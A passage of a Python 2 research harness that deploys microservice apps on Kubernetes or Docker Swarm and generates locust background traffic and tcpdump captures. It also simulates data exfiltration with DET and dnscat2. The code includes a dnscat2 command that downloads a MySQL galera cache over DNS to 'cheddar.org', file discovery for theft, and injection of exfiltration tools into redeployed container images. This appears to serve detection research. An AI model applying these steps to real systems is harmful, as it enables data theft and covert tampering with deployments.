                seastore_cmds = ["locust", "-f", "./load_generators/seashop_background.py", "-H=https://"+ip+ ":" +str(port),
                            "--no-web", "-c",  client_count, "-r", spawn_rate, '--csv=' + locust_info_file]
                #print "seastore!", seastore_cmds
                proc = subprocess.Popen(seastore_cmds,
                            preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
            #proc = subprocess.Popen(["locust", "-f", "./load_generators/wordpress_background.py", "--host=https://192.168.99.103:31758",
            #                        "--no-web", "-c", client_count, "-r", spawn_rate],
            #                        stdout=devnull, stderr=devnull, preexec_fn=os.setsid)
            elif app_name == "wordpress":
                '''
                                wordpress_cmds = ["locust", "-f", "./wordpress_setup/wordpress_background.py", "--host=https://"+ip+ ":" +str(port),
                                  "--no-web", "-c", str(client_count), "-r", str(spawn_rate),
                                  "--csv=" + locust_info_file, "-t", str(int(timestep) - 1) + 's']
                '''
                wordpress_cmds = ["locust", "-f", "./wordpress_setup/wordpress_background.py", "-H=https://"+ip+ ":" +str(port),
                                  "--no-web", "-c", str(client_count), "-r", str(spawn_rate),
                                  "--csv=" + locust_info_file, "-t", str(int(timestep) - 1) + 's']
                print "wordpress_cmds", wordpress_cmds
                proc = subprocess.Popen(wordpress_cmds, preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
            elif app_name == "hipsterStore":
                #hipsterStore_cmds = ["locust", "-f", "./microservices-demo/src/loadgenerator/locustfile.py", "--host=http://"+ip+ ":" +str(port),
                #                  "--no-web", "-c", str(client_count), "-r", str(spawn_rate), "--csv=" + locust_info_file]
                '''
                                hipsterStore_cmds = ["locust", "-f", "./hipsterStore_setup/background_traffic.py",
                                     "--host=http://" + ip + ":" + str(port),
                                     "--no-web", "-c", str(client_count), "-r", str(spawn_rate),
                                     "--csv=" + locust_info_file, "-t", str(int(timestep) - 1) + 's']
                '''
                hipsterStore_cmds = ["locust", "-f", "./hipsterStore_setup/background_traffic.py",
                                     "-H=http://" + ip + ":" + str(port),
                                     "--no-web", "-c", str(client_count), "-r", str(spawn_rate),
                                     "--csv=" + locust_info_file, "-t", str(int(timestep) - 1) + 's']
                print "hipsterStore_cmds", hipsterStore_cmds
                proc = subprocess.Popen(hipsterStore_cmds, preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
            elif app_name == 'robot-shop':
                robot_shop_cmds = None # TODO
                print "robot_shop_cmds", robot_shop_cmds
                proc = subprocess.Popen(robot_shop_cmds, preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
            else:
                print "ERROR WITH START BACKGROUND TRAFFIC- NAME NOT RECOGNIZED"
                exit(5)

        except subprocess.CalledProcessError as e:
            print "LOCUST CRASHED"
            raise RuntimeError("command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output))

        print("Time: " + str(i) +  ". Now running with " + client_count + " simultaneous clients")

        #Run some number of background clients for 1/24th of the total test time
        time.sleep(timestep-0.5)
        # this stops the background traffic process

        if proc:
            #print proc.poll
            print "killing locust", os.killpg(os.getpgid(proc.pid), signal.SIGTERM) # should kill it

            time.sleep(0.5)

            try:
                os.kill(os.getpgid(proc.pid), 0)
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except:
                pass # process does not exist ---> do not do anything...

            #print "proc hopefully killed", proc.poll
            #'''
            #time.sleep(0.5)
            #try:
            #    print "killing locust w/ signal 9", os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            #except:
            #    pass
            #'''
        #subprocess.call([locust_info_file + '_requests.csv', '>>', locust_info_file])
        #try:
        aggregate_locust_file(locust_info_file +'_stats.csv', locust_info_file + '_AGGREGATED')
        total_requests, failed_requests, fail_percentage = sanity_check_locust_performance(locust_info_file +'_stats.csv')

        try:
            os.remove(locust_info_file +'_stats.csv')
        except OSError:
            print "couldn't remove the locust file:", locust_info_file +'_stats.csv'

        #except Exception as e:
        #    raise("exception_in_prepare_apps: " + e.output)

        print "total_requests requests", total_requests, 'failed_requests', failed_requests, "fail percentage", fail_percentage
        total_total_requests += int(total_requests)
        total_failed_requests += int(failed_requests)

        with open(locust_info_file, 'w') as f:
            print >>f, "total_total_requests", total_total_requests, "total_failed_requests", total_failed_requests

        subprocess.Popen( pod_config_log_cmds )


def get_IP(orchestrator):
    if orchestrator == "kubernetes":
        ip = subprocess.check_output(["kubectl", "config", "view"])
        for thing in ip.split("\n"):
            if "https" in thing:
                return thing.split(":")[2].split("//")[1]
    if orchestrator == "docker_swarm":
        return "0"
    return "-1"


def start_tcpdump(interface, network_namespace, tcpdump_time, filename, orchestrator, sentinal_file_loc):
    print "start_tcpdump_called"

    start_netshoot = "docker run -it --rm -v /var/run/docker/netns:/var/run/docker/netns -v /home/docker:/outside --privileged=true nicolaka/netshoot"
    print network_namespace, tcpdump_time
    switch_namespace =  'nsenter --net=/var/run/docker/netns/' + network_namespace + ' ' 'sh'

    # so for docker swarm this is pretty simple, b/c there is really just a single candidate
    # in each network namespace. But for k8s, it appears that there is a decent-size number
    # of interfaces even tho there is a relatively-small number of network namespaces
    if not interface:
        if network_namespace == "bridge":
            interface = "eth0"
            switch_namespace = 'su'
        elif network_namespace == 'ingress_sbox':
            interface = "eth1" # already handling 10.255.XX.XX, which is the entry point into the routing mesh
            # this is stuff that arrives on the routing mesh
        else:
            interface = "br0"
    # re-enable if you want rotation and compression!
    #tcpdump_time = str(int(tcpdump_time) / 10) # dividing by 10 b/c going to rotate
    #start_tcpdum = "tcpdump -G " + tcpdump_time + ' -W 10 -i ' + interface + ' -w /outside/\'' + filename \
    #               + '_%Y-%m-%d_%H:%M:%S.pcap\''+ ' -n' + ' -z gzip '

    #### NOTE: I TOOK OFF THE -N TO WHETHER IT SOLVES MY PROBLEMS <-- NOTE: put it back in b/c it makes tcpdump drop lots of pkts
    # NOTE: if you want the whole packet body, then get-rid-of/adjust the "-s 94" part!
    #start_tcpdum = "tcpdump -s 94 -G " + tcpdump_time + ' -W 1 -i ' + interface + ' -w /outside/' + filename + ' -n'
    # NOTE: HTTP headers are important now! trying to scale it up@
    start_tcpdum = "tcpdump -s 1024 -G " + tcpdump_time + ' -W 1 -i ' + interface + ' -w /outside/' + filename + ' -n'


    cmd_to_send = start_netshoot + ';' + switch_namespace + ';' + start_tcpdum
    print "cmd_to_send", cmd_to_send
    print "start_netshoot", start_netshoot
    print "switch_namespace", switch_namespace
    print "start_tcpdum", start_tcpdum

    args = ['docker-machine', 'ssh', 'default', '-t', cmd_to_send]

    if orchestrator == 'docker_swarm':
        child = pexpect.spawn('docker-machine ssh default')
        child.expect('##')
    elif orchestrator == 'kubernetes':
        #child.expect(' ( ) ')
        sh = process('/bin/sh')
        cmd_str = 'sudo minikube ssh'
        sendline_and_wait_responses(sh, cmd_str, timeout=3)
    else:
        print "orchestrator not recognized"
        exit(23)

    #print child.before, child.after
    print "###################"
    sendline_and_wait_responses(sh, start_netshoot, timeout=180)
    sendline_and_wait_responses(sh, switch_namespace, timeout=5)

    '''
    #child.sendline(start_netshoot)
    #child.expect('Netshoot')
    print child.before, child.after
    child.sendline(switch_namespace)
    child.expect('#')
    print child.before, child.after
    '''
    ##############################
    # the code below is necessary to ensure that all the threads sync up properly
    while not os.path.exists(sentinal_file_loc):
        time.sleep(0.3)
    # letting the background load generator get a head start...
    time.sleep(3)
    print "start_tcpdump part going!"
    ##############################
    #child.sendline(start_tcpdum)
    #child.expect('bytes')
    #print child.before, child.after
    #sendline_and_wait_responses(sh, start_tcpdum, timeout=1)
    sh.sendline(start_tcpdum)
    print "okay, all commands sent!"
    #print "args", args
    #out = subprocess.Popen(args)
    #print out

    time.sleep(int(tcpdump_time) + 2)

    # don't want to leave too many docker containers running
    #child.sendline('exit')
    #child.sendline('exit')
    sh.sendline('exit')
    sh.sendline('exit')

def sendline_and_wait_responses(sh, cmd_str, timeout=5):
    sh.sendline(cmd_str)
    line_rec = 'start'
    while line_rec != '':
        line_rec = sh.recvline(timeout=timeout)
        if 'Please enter your response' in line_rec:
            sh.sendline('n')
        print("recieved line", line_rec)

def recover_pcap(orchestrator, filename):
    print "okay, about to remove the pcap file from minikube"
    if orchestrator == 'docker_swarm':
        args2 = ["docker-machine", "scp",
                 "docker@default:/home/docker/" + filename, filename]
    elif orchestrator == 'kubernetes':
        minikube_ssh_key_cmd = ["minikube", "ssh-key"]
        minikube_ssh_key = subprocess.check_output(minikube_ssh_key_cmd)
        minikube_ip_cmd = ["minikube", "ip"]
        minikube_ip = subprocess.check_output(minikube_ip_cmd)
        minikube_ssh_key= minikube_ssh_key.rstrip('\n')
        minikube_ip = minikube_ip.rstrip('\n')
        print minikube_ssh_key
        print minikube_ip
        args2 = ["scp", "-i", minikube_ssh_key, '-o', 'StrictHostKeyChecking=no',
                 '-o', 'UserKnownHostsFile=/dev/null', "docker@"+minikube_ip+":/home/docker/" + filename,
                 filename]
    else:
        print "orchestrator not recognized"
        exit(23)
    # tcpdump file is safely on minikube but we might wanna move it all the way to localhost
    print "going to remove pcap file with this command", args2
    out = subprocess.check_output(args2)
    print out

def find_container_in_class(proxy_class, class_to_networks, orchestrator='kubernetes'):
    possible_proxies, class_to_networks[proxy_class] = get_class_instances(orchestrator, proxy_class,"None")
    selected_proxy = random.sample(possible_proxies[proxy_class], 1)
    return selected_proxy, class_to_networks


def install_exfil_dependencies(exfil_paths, orchestrator, class_to_installer, exfil_path_class_to_image):
    print "installing exfil_dependencies..."
    print "exfil_paths",exfil_paths
    print "class_to_installer",class_to_installer

    # let's find all elements (classes) on which I want to install the exfil dependencies
    exfil_elements = set()
    for exfil_path in exfil_paths:
        for element in exfil_path:
            exfil_elements.add(element)

    # let's find a containers that match the element class
    for element in list(exfil_elements):
        containers,networks = get_class_instances(orchestrator, element, "None")
        # now actually install the dependencies
        chosen_container = containers[0]
        print "current_container_type:", element
        install_det_dependencies(orchestrator, chosen_container, class_to_installer[element])
        # now commit the image
        old_image_name = None
        print "image tags", chosen_container.image.tags
        print "element",element,"exfil_path_class_to_image",exfil_path_class_to_image, element in exfil_path_class_to_image
        try:
            container_element = exfil_path_class_to_image[element]
        except:
            container_element = element

        print "element", element
        print "container_element", container_element
        for tag in chosen_container.image.tags:
            if container_element in tag:
                old_image_name = tag
                break

        base_image_name,old_tag_version = old_image_name.split(':')[:-1],old_image_name.split(':')[-1]
        base_image_name = ":".join(base_image_name)
        new_tag_vesion = base_image_name + ':' + old_tag_version[:-1] + str(int(old_tag_version[-1]) + 1)
        new_tag_version_shorter = old_tag_version[:-1] + str(int(old_tag_version[-1]) + 1)
        chosen_container.commit(tag=new_tag_version_shorter, repository = base_image_name)

        # okay, now update kubernetese deployment
        # I'm going to use the kubernetes python client and follow the code at:
        # https://github.com/FingerLiu/client-python/blob/9ae080693cd16ce825a977cc167803ab1f7f1202/examples/deployment_examples.py#L56
        kubernetes.config.load_kube_config()
        k8s_beta = kubernetes.client.ExtensionsV1beta1Api()
        # step (1): find corresponding kubernetes deployment
        api_response = k8s_beta.list_deployment_for_all_namespaces()
        ## TODO: not a deploymnet... it's a replica set...

        cur_relevant_deployment = None
        for item in api_response.items:
            print "item", item.metadata.labels
            if 'name' in item.metadata.labels:
                if element == item.metadata.labels['name']:
                    cur_relevant_deployment = item
                    break
            if 'app' in item.metadata.labels:
                if element == item.metadata.labels['app']:
                    cur_relevant_deployment = item
                    break

        if not cur_relevant_deployment:
            ## TODO: handle the stateful set setup of the physcial exfil...
            ## we'll do this at some point in time... but not now b/c there are more important
            ## angles to explore...
            #client2 = kubernetes.client.AppsV1beta1Api
            #api_response_stateful_set = client2.V1beta1StatefulSetList()
                #V1beta1StatefulSet()
            pass

        # step (2): update the deployment
        print "cur_relevant_deployment",cur_relevant_deployment.metadata.labels
        cur_relevant_deployment.spec.template.spec.containers[0].image = new_tag_vesion
        api_response = k8s_beta.patch_namespaced_deployment(
            name=element,
            namespace=cur_relevant_deployment.metadata.namespace,
            body=cur_relevant_deployment)
        print("Deployment updated. status='%s'" % str(api_response.status))


# returns a list of container names that correspond to the
# selected class
def get_class_instances(orchestrator, class_name, class_to_net):
    #print "finding class instances for: ", class_name
    if orchestrator == "kubernetes":
        client = docker.from_env(timeout=300)
        container_instances = []
        for container in client.containers.list():
            #print "container", container, container.name
            # note: lots of containers have a logging container as a sidecar... wanna make sure we don't use that one
            if class_name in container.name and 'log' not in container.name and 'POD' not in container.name and \
                    (('-db' in class_name) == ('-db-' in container.name)):
                #print class_name, container.name
                container_instances.append(container)

        for network in client.networks.list():
            if 'bridge' in network.name:
                # only want this network
                container_networks_attached = [network]
                break

        return container_instances, list(set(container_networks_attached))

    elif orchestrator == "docker_swarm":
        networks = class_to_net[class_name]
        client = docker.from_env(timeout=300)
        container_instances = []
        container_networks_attached = []
        #'''
        for container in client.containers.list():
            #print "containers", network.containers
            if class_name + '.' in container.name:
                print class_name, container.name
                container_instances.append(container)
                #container_networks_attached.append(network)

        for network in client.networks.list():
            for connected_nets in networks:
                if connected_nets in network.name:
                    container_networks_attached.append(network)

        return container_instances, list(set(container_networks_attached))
    else:
        pass


def get_network_ids(orchestrator, list_of_network_names):
    if orchestrator == "kubernetes":
        # using minikube, so only two networks that I need to handle
        # bridge and host
        return list_of_network_names
    elif orchestrator == "docker_swarm":
        network_ids = []
        client = docker.from_env()
        for network_name in list_of_network_names:
            for network in client.networks.list(greedy=True):
                print network, network.name, network_name
                if network_name == network.name:
                    network_ids.append(network.id)

        network_ids.append("bridge")
        network_ids.append('ingress_sbox')

        print "just finished getting network id's...", network_ids
        return network_ids
    else:
        # TODO
        pass


def map_container_instances_to_ips(orchestrator, class_to_instances, class_to_networks, network_plugin):
    #if orchestrator == "docker_swarm":
    # i think this can work for both orchestrators
    instance_to_networks_to_ip = {}
    #print "class_to_instance_names", class_to_instances.keys()
    #print class_to_instances
    ice = 0
    if network_plugin =='cilium':
        pod_to_ip = get_cilium_mapping()
        print "pod to ip", pod_to_ip
    for class_name, container in class_to_instances.iteritems():
        #print 'class_to_networks[class_name]', class_to_networks[class_name], class_name,  class_to_networks
        # use if cilium
        if network_plugin == 'cilium':
            print "theoretically connected networks", class_to_networks[class_name]
            if 'POD' not in container.name:
                for ip, pod_net in pod_to_ip.iteritems():
                    if container.name.split('_')[2] in pod_net[0] and ":" not in ip: # don't want ipv6
                        instance_to_networks_to_ip[ container ] = {}
                        #print 'pos match', ip, pod_net, container.name.split('_')[2]
                        instance_to_networks_to_ip[container][class_to_networks[class_name][0]] = ip
                        #print "current instance_to_networks_to_ip", instance_to_networks_to_ip
        else:
            # if not cilium
            instance_to_networks_to_ip[ container ] = {}
            if orchestrator =='kubernetes':
                # for k8s, cannot actually use the coantiner_attribs for the container.
                # need to use the attribs of the corresponding pod
                container_atrribs = find_corresponding_pod_attribs(container.name) ### TODO ####
            else:
                container_atrribs =  container.attrs

            for connected_network in class_to_networks[class_name]:
                ice += 1
                instance_to_networks_to_ip[container][connected_network] = []
                try:
                    #print "container_attribs", container_atrribs["NetworkSettings"]["Networks"]
                    #print "connected_network.name", connected_network, 'end connected network name'
                    ip_on_this_network = container_atrribs["NetworkSettings"]["Networks"][connected_network.name]["IPAddress"]
                    instance_to_networks_to_ip[container][connected_network] = ip_on_this_network
                except:
                    pass
    #print "ice", ice
    #print "instance_to_networks_to_ip", instance_to_networks_to_ip
    return instance_to_networks_to_ip
    #elif orchestrator == "kubernetes":
        # okay, so that strategy above is not going to work here b/c the container configs
        # don't contain this info. However, there's only a single network that we know everyting
        # is attached to, so let's just try that?
        # for container in client.networks.get('bridge').containers:
        #print container.attrs["NetworkSettings"]["Networks"]['bridge']["IPAddress"]
        #pass
    #else:
    #pass # maybe want to return an error?

def get_cilium_mapping():
    cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
                          "-o", "json"]
    out = subprocess.check_output(cilium_endpoint_args)
    container_config = json.loads(out)
    ip_to_pod = parse_cilium(container_config)
    return ip_to_pod

def find_corresponding_pod_attribs(cur_container_name):
    client = docker.from_env()
    # note: this parsing works for wordpress, might not work for others if structure of name is different
    #print "cur_container_name", cur_container_name
    part_of_name_shared_by_container_and_pod = '_'.join('-'.join(cur_container_name.split('-')[3:]).split('_')[:-1])
    #print "part_of_name_shared_by_container_and_pod", part_of_name_shared_by_container_and_pod
    for container in client.containers.list():
        # print "containers", network.containers
        #print "part_of_name_shared_by_container_and_pod", part_of_name_shared_by_container_and_pod
        if part_of_name_shared_by_container_and_pod in container.name and 'POD' in container.name:
            #print "found container", container.name
            return container.attrs

def parse_cilium(config):
    mapping = {}
    for pod_config in config:
        pod_name = pod_config['status']['external-identifiers']['pod-name']
        ipv4_addr = pod_config['status']['networking']['addressing'][0]['ipv4']
        ipv6_addr = pod_config['status']['networking']['addressing'][0]['ipv6']
        mapping[ipv4_addr] = (pod_name, 'cilium')
        mapping[ipv6_addr] = (pod_name, 'cilium')
    return mapping
    
def install_det_dependencies(orchestrator, container, installer):
    #if orchestrator == 'kubernetes':
    #    ## todo
    #    pass
    if orchestrator == "docker_swarm" or orchestrator == 'kubernetes':
        # okay, so want to read in the relevant bash script
        # make a list of lists, where each list is a line
        # and then send each to the container
        #''' # Note: this is only needed for Atsea Shop
        #upload_config_command = ["docker", "cp", "./exp_support_scripts/modify_resolve_conf.sh", container.id+ ":/modify_resolv.sh"]
        #out = subprocess.check_output(upload_config_command)
        #print "upload_config_command", upload_config_command, out

        #out = container.exec_run(['sh', '//modify_resolv.sh'], stream=True, user="root")
        #print out
        #'''

        if installer == 'apk':
            filename = './install_scripts/apk_det_dependencies.sh'
        elif installer =='apt':
            filename = './install_scripts/apt_det_dependencies.sh'
        elif installer == 'tce-load':
            filename = './install_scripts/tce_load_det_dependencies.sh'
        else:
            print "unrecognized installer, cannot install DET dependencies.."
            filename = ''

        upload_install_command = ["docker", "cp", filename, container.id + ":/install.sh"]
        out = subprocess.check_output(upload_install_command)
        print "upload_install_command", upload_install_command, out
        out = container.exec_run(['sh', '//install.sh'], stream=True, user="root")
        for outline in out.output:
            print outline

            # NOTE: no longer doing it the way below... I need to copy the file in and use that instead
        #with open(filename, 'r') as fp:
        #    read_lines = fp.readlines()
        #    read_lines = [line.rstrip('\n') for line in read_lines]

        #for command_string in read_lines:
        #    command_list = command_string.split(' ')
        #    print container.name
        #    print "command string", command_string
        #    print "command list", command_list
        #    # problem: doesn't run as root...
        #    out = container.exec_run(command_list, stream=True, user="root")
        #    print "response from command string:"
        #    for output in out.output:
        #        print output
        #    print "\n"
    else:
        pass


def map_network_ids_to_namespaces(orchestrator, full_network_ids):
    print "map_network_ids_to_namespaces", orchestrator, full_network_ids
    network_ids_to_namespaces = {}
    if orchestrator == 'kubernetes':
        print "map_network_ids_to_namespaces in k8s part"
        network_ids_to_namespaces = {}
        for full_id in full_network_ids:
            print "full_id", full_id
            if full_id == 'bridge':
                network_ids_to_namespaces['bridge'] = 'default'
        return network_ids_to_namespaces


# note: det must be a single ip, in string form, ATM
def start_det_proxy_mode(orchestrator, container, src, dst, protocol, maxsleep, maxbytesread, minbytesread, det_log_file):
    network_ids_to_namespaces = {}
    if orchestrator == "docker_swarm" or orchestrator == 'kubernetes':
        # okay, so this is what we need to do here
        # (0) create a new config file
            # probably want to use sed (#coreutilsonly)
        # (1) upload the new configuration file to the container
            # use 'docker cp' shell command
        # (2) send a command to start DET
            # just use container.exec_run, it's a one liner, so no big deal
        # going to do a bit of a workaround below, since using pipes with the subprocesses
        # module is tricky, so let's make a copy of the file we want to modify and then we
        # can just modify it in place
        cp_command = ['cp', './exp_support_scripts/det_config_template.json', './current_det_config.json']
        out = subprocess.check_output(cp_command)
        #print "cp command result", out

        targetip_switch = "s/TARGETIP/\"" + dst + "\"/"
        print src
        src_string = ""
        #for src in srcs[:-1]:
        #src_string += "\\\"" + src +  "\\\"" + ','
        src_string += "\\\"" + src +  "\\\""
        proxiesip_switch = "s/PROXIESIP/" + "[" + src_string  + "]" + "/"
        #print "targetip_switch", targetip_switch
        #print "proxiesip_switch", proxiesip_switch
        maxsleeptime_switch = "s/MAXTIMELSLEEP/" + "{:.2f}".format(maxsleep) + "/"
        maxbytesread_switch = "s/MAXBYTESREAD/" + str(maxbytesread) + "/"
        minbytesread_switch = "s/MINBYTESREAD/" + str(minbytesread) + "/"
        sed_command = ["sed", "-i", "-e",  targetip_switch, "-e", proxiesip_switch, "-e", maxsleeptime_switch,
                       "-e", maxbytesread_switch, "-e", minbytesread_switch, "./current_det_config.json"]
        #print "sed_command", sed_command
        out = subprocess.check_output(sed_command)
        #print "sed command result", out

        upload_config_command = ["docker", "cp", "./current_det_config.json", container.id+ ":/config.json"]
        out = subprocess.check_output(upload_config_command)
        #print "upload_config_command", upload_config_command
        #print "upload_config_command result", out

        time.sleep(1)
        start_det_command = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-Z"]
        print "start_det_command", start_det_command

        # stdout=False b/c hangs otherwise
        #file_name = container.name + ' det proxy output.txt'

        try:
            container.exec_run(start_det_command, user="root", workdir='/DET',stdout=False, detach=True)
            #print "response from DET proxy start command:"
            #print out
        except:
            print "start det proxy command is hanging, going to hope it is okay and just keep going"
        #for output in out.output:
        #    print output
        #print "\n"

        with open(det_log_file, 'a') as g:
            fcntl.flock(g, fcntl.LOCK_EX)
            g.write(str(container.name) + ' should be started now!')
            fcntl.flock(g, fcntl.LOCK_UN)

    else:
        pass


def start_det_server_local(protocol, src, maxsleep, maxbytesread, minbytesread, experiment_name, det_log_file):
    # okay, need to modify this so that it can work (can use the working version above as a template)
    #'''
    cp_command = ['sudo', 'cp', "./exp_support_scripts/det_config_local_template.json", "/DET/det_config_local_configured.json"]
    out = subprocess.check_output(cp_command)
    print "cp command result", out

    #proxiesip_switch = "s/PROXIESIP/" + "[\\\"" + srcs[0] + "\\\"]" + "/"
    src_string = ""
    #for src in srcs[:-1]:
    #    src_string += "\\\"" + src +  "\\\"" + ','
    src_string += "\\\"" + src +  "\\\""
    proxiesip_switch = "s/PROXIESIP/" + "[" + src_string  + "]" + "/"

    #maxsleep = float(maxsleep)
    maxsleeptime_switch = "s/MAXTIMELSLEEP/" + "{:.2f}".format(maxsleep) + "/"
    maxbytesread_switch = "s/MAXBYTESREAD/" + str(maxbytesread) + "/"
    minbytesread_switch = "s/MINBYTESREAD/" + str(minbytesread) + "/"
    sed_command = ["sudo", "sed", "-i", "-e", proxiesip_switch, "-e", maxsleeptime_switch, "-e", maxbytesread_switch,
                   "-e", minbytesread_switch,"/DET/det_config_local_configured.json"]
    print "proxiesip_switch", proxiesip_switch
    print "sed_command", sed_command
    out = subprocess.check_output(sed_command)
    print out
    # note: don't have to move anything b/c the file is already local
    #out = subprocess.check_output(['pwd'])
    #print out
    #'''
    cmds = ["sudo", "python", "/DET/det.py", "-L" ,"-c", "/DET/det_config_local_configured.json", "-p", protocol]
    #out = subprocess.Popen(cmds, cwd='/DET/')
    print "commands to start DET", cmds

    with open(det_log_file, 'a') as g:
        fcntl.flock(g, fcntl.LOCK_EX)
        g.write('DET LOCAL starting: ' + ' '.join(cmds))
        fcntl.flock(g, fcntl.LOCK_UN)

    # okay, I am going to want to actually parse the results so I can see how often the data arrives
    # which will allow me to find the actual rate of exfiltration, b/c I think DET might be rather
    # slow...
    # removed: stdout=subprocess.PIPE,
    # note: this will remove the files existing contents (which is fine w/ me!)
    with open('./' + experiment_name + '_det_server_local_output.txt', 'w') as f:
        cmd = subprocess.Popen(cmds, cwd='/DET/', preexec_fn=os.setsid, stdout=f)

    return cmd

def parse_local_det_output(exfil_info_file_name, protocol):
    #print "this is the local det server parsing function!"
    total_bytes = 0
    first_time = None
    last_time = None
    with open(exfil_info_file_name, 'r') as f:
        for line in f.readlines():
            #print "before recieved", line
            if "Received" in line and protocol in line:
                #print "line", line
                #print '\n'
                #print "after recieved", line.replace('\n','')
                matchObj = re.search(r'(.*)Received(.*)bytes(.*)', line)
                #print matchObj.group()
                bytes_recieved = int(matchObj.group(2))
                total_bytes += bytes_recieved
                #print "bytes recieved...", bytes_recieved
                #print "total bytes...", total_bytes
                # okay, let's find some times...
                #matchObjTime = re.search(r'\[(.*)\](.*)\](.*)', line)
                matchObjTime = re.search(r'\[(.*)\](.*)\](.*)', line)
                #print "time..", matchObjTime.group(1)
                if not first_time:
                    try:
                        first_time = matchObjTime.group(1)
                    except:
                        print "line caused problem: ", line, matchObjTime
                try:
                    last_time = matchObjTime.group(1)
                except:
                    print "line caused problem: ", line, matchObjTime

    open(exfil_info_file_name, 'w').close() #let's wipe it immediately... controversial, but I want to be sure

    return total_bytes, first_time, last_time

def setup_config_file_det_client(dst, container, directory_to_exfil, regex_to_exfil, maxsleep, minbytesread, maxbytesread):
    # note: don't want to actually start the client yet, however
    out = subprocess.check_output(['pwd'])
    #print out

    cp_command = ['cp', './exp_support_scripts/det_config_client_template.json', './det_config_client.json']
    out = subprocess.check_output(cp_command)
    #print "cp command result", out

    #print 'dst', dst
    targetip_switch = "s/TARGETIP/\"" + dst + "\"/"
    #print "targetip_switch", targetip_switch
    maxsleeptime_switch = "s/MAXTIMELSLEEP/" + "{:.2f}".format(maxsleep) + "/"
    maxbytesread_switch = "s/MAXBYTESREAD/" + str(maxbytesread) + "/"
    minbytesread_switch = "s/MINBYTESREAD/" + str(minbytesread) + "/"
    sed_command = ["sed", "-i", "-e", targetip_switch, "-e", maxsleeptime_switch, "-e", maxbytesread_switch, "-e",
                   minbytesread_switch, "./det_config_client.json"]
    #print "sed_command", sed_command
    out = subprocess.check_output(sed_command)
    #print "sed command result", out

    upload_config_command = ["docker", "cp", "./det_config_client.json", container.id + ":/config.json"]
    out = subprocess.check_output(upload_config_command)
    #print "upload_config_command", upload_config_command
    #print "upload_config_command result", out

    # i also want to move ./exp_support_scripts/loop.py here (so that I can call it easily later on)
    upload_loop_command = ["docker", "cp", "./exp_support_scripts/loop.py", container.id + ":/DET/loop.py"]
    out = subprocess.check_output(upload_loop_command)
    #print "upload_loop_command", upload_loop_command
    #print "upload_loop_command result", out

    find_file_to_exfil = "find " + directory_to_exfil + " -name " + regex_to_exfil
    #print "find_file_to_exfil", find_file_to_exfil
    file_to_exfil = container.exec_run(find_file_to_exfil, user="root", stdout=True, tty=True)
    #print "file_to_exfil", file_to_exfil, file_to_exfil.output, "end file to exfil"
    file_to_exfil = file_to_exfil.output.split('\n')[0].replace("\n", "").replace("\r", "")
    #print "start file to exfil", file_to_exfil, "end file to exfil"
    #print next( file_to_exfil.output )
    return file_to_exfil

def setup_dnscat_server():
    ## TODO: definitely NOT going to be doing this manually...
    # Step (1): install dnscat_server dependencies + start it (already have a script ready to go)
    #### note: ensure dnscat's upstream is what would normally by the upstream
    ### NO ^^^ do not install stuff in this file!!!!! <--- installing is for run_exp_on_cloudlab
    dnscat_start_server = "ruby ./dnscat2/server/dnscat2.rb cheddar.org; set passthrough=8.8.8.8:53; set auto_command=download " \
                          "/var/lib/mysql/galera.cache ./exfil; delay 5; window -i dns1"
    ## wait?? is this the correct place to do this??? ^^^
    ## this is too janky I think for run_experiment...
    ## if possible, I'd want to switch this at another point in time (like during setup)
    # why? why do it in setup??? this seems like a reasonable place to do it
    # though I agree that we need to extract the existing config map before switching

    ## step (2) : switch the upstream dns server.

    ### TODO: okay, here is the plan. Keep it here. Try switching the DNS
    ### Server and see if installing stuff still works. If it does, we are
    ### fine. Otherwise we have a whole LOT of work to do after that...

    # Step (2): switch upstream DNS server of kubernetes deployment (to the dnscat server...)
    # Step (3): [LATER] switch it back @ and of experiment
    pass

def start_dnscat_client(container, det_log_file):
    cmds = ['/dnscat2/client/dnscat', 'cheddar.org']
    print "start dns exfil commands", str(cmds)
    out = container.exec_run(cmds, user="root", workdir='/dnscat2/client/', stdout=True)
    print "dnscat client output output"

    with open(det_log_file, 'a') as g:
        fcntl.flock(g, fcntl.LOCK_EX)
        g.write(out + '\n')
        fcntl.flock(g, fcntl.LOCK_UN)

def stop_dnscat_client(container):
    cmds = ["pkill", "dnscat"]
    out = container.exec_run(cmds, user="root", stream=True)
    print "stop dnscat client output: "#, out
    #print "response from command string:"
    for output in out.output:
        print output

def start_det_client(file, protocol, container, det_log_file):
    #cmds = ["python", "/DET/det.py", "-c", "/config.json", "-p", protocol, "-f", file]
    #print "start det client commands", str(cmds)
    #print "start det client commands", str(cmds)[1:-1]

    with open(det_log_file, 'a') as g:
        fcntl.flock(g, fcntl.LOCK_EX)
        g.write('DET originator: ' + str(container) + ';' + str(container.name) + '\n')
        fcntl.flock(g, fcntl.LOCK_UN)


    #arg_string = ''
    #for cmd in cmds:
    #    arg_string += cmd + ' '
    #    #print arg_string
    #arg_string = arg_string[:-1]
    loopy_cmds = ["python", "/DET/loop.py", protocol, file]
    print "start_det_client_cmds", loopy_cmds
    out = container.exec_run(loopy_cmds, user="root", workdir='/DET', stdout=False)
    #out = container.exec_run(cmds, user="root", workdir='/DET', stdout=False)
    print "start det client output", out

    #'''
    with open(det_log_file, 'a') as g:
        fcntl.flock(g, fcntl.LOCK_EX)
        g.write('DET Originator Output: ' + str(out) + '\n')
        fcntl.flock(g, fcntl.LOCK_UN)
    #'''

def stop_det_client(container):
    ## let's just kill all python processes, that'll be easier than trying to record PIDs, or anything else
    cmds = ["pkill", "-9", "python"]
    out =container.exec_run(cmds, user="root", stream=True)
    print "stop det client output: "#, out
    #print "response from command string:"
    for output in out.output:
        print output

def find_dst_and_src_ips_for_det(exfil_path, current_class_name, selected_container, localhostip,
                                 proxy_instance_to_networks_to_ip, class_to_networks):
    current_loc_in_exfil_path = exfil_path.index(current_class_name)
    current_class_networks = class_to_networks[current_class_name] #proxy_instance_to_networks_to_ip[current_class_name].keys()

    if current_class_name not in exfil_path:
        return None, None

    # at originator -> no src (or rather, it is the exp_support_scripts for itself):
